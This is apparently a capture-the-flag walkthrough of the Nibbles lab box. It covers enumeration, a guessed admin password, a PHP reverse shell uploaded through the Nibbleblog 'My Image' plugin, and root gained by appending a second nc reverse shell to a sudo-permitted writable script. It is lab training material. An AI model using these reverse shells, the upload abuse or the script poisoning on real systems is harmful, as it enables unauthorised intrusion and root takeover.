**Date:** 2026-04-05
**Category:** #Full_Chain / #CMS_Exploitation / #Sudo_Hijacking
**Target IP:** `10.129.200.170`
**Attacker IP:** `10.10.14.75`
**Status:** **Completed ✅**

---

## 🔍 Phase 1: External Enumeration

> **Objective:** Identify the attack surface and find a "Leaky" entry point.

### 🛠️ Execution & Intelligence

1. **Service Discovery:** `nmap -sV --open 10.129.200.170`
    
    - **Result:** Port 22 (SSH) and 80 (HTTP) open.
        
2. **Web Footprinting:** Found an HTML comment in the root source code pointing to `/nibbleblog/`.
    
3. **Directory Fuzzing:**
    ```
    gobuster dir -u http://10.129.200.170/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
    ```
    
    - **Findings:** `/admin.php` (Login), `/content/` (Data), `/README` (Version info).
        
4. **Credential Harvesting:** Found `admin` in `users.xml`. Guessed the password as `nibbles` based on the box name. **Login Successful.**
    

---

## 🐚 Phase 2: Initial Foothold (Reverse Shell)

> **Objective:** Convert authenticated Web access into an interactive OS shell.

### 🛠️ The "My Image" Plugin Exploit

1. **Payload Creation:** Created `image.php` containing a PHP reverse shell.
    ```
    <?php system ("rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.75 9443 >/tmp/g"); ?>
    ```
    
2. **Upload:** Exploited the "My Image" plugin's upload feature to bypass file-type restrictions.
    
3. **Execution:** Triggered the shell by navigating to the upload path in `/content/private/plugins/my_image/image.php`.
    
4. **TTY Upgrade:**
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Followed by stty raw -echo; fg to fix the terminal size and features.
    ```
    

---

## 🪜 Phase 3: Vertical Privilege Escalation

> **Objective:** Escalate from the `nibbler` user to `root`.

### 🔍 Automated Discovery

Transferred `LinEnum.sh` via a Python HTTP server.

- **Finding:** `sudo -l` revealed that `nibbler` can execute `/home/nibbler/personal/stuff/monitor.sh` as **root** without a password.
    

### 🛠️ Script Poisoning (The Sudo Trap)

Since the script was writable by our user, we appended a new reverse shell payload to the end of it:
```
echo 'rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.10.14.75 8443 >/tmp/h' >> /home/nibbler/personal/stuff/monitor.sh
```

### 🏁 Execution & Root Access

1. Started a second listener on port `8443`.
    
2. Executed the script with sudo: `sudo /home/nibbler/personal/stuff/monitor.sh`
    
3. **Result:** Instant connection as `root`.
    

---

## 🚩 Loot & Flags

|**Flag Type**|**Value**|
|---|---|
|**User**|`cat /home/nibbler/user.txt`|
|**Root**|`cat /root/root.txt`|

---

## 🧠 Lessons Learned

- **Enumeration Scripts:** `LinEnum.sh` is essential. It highlights the `sudo -l` entry that is the direct path to root.
    
- **The "Wait" State:** When you trigger the poisoned script, the first terminal will "hang." This isn't a crash; it's the indicator that your shell is active on the second listener.
    
- **CMS Intelligence:** Always check the `/content/private/` directory in CMS platforms like Nibbleblog. It often stores XML files containing usernames or sensitive configuration data.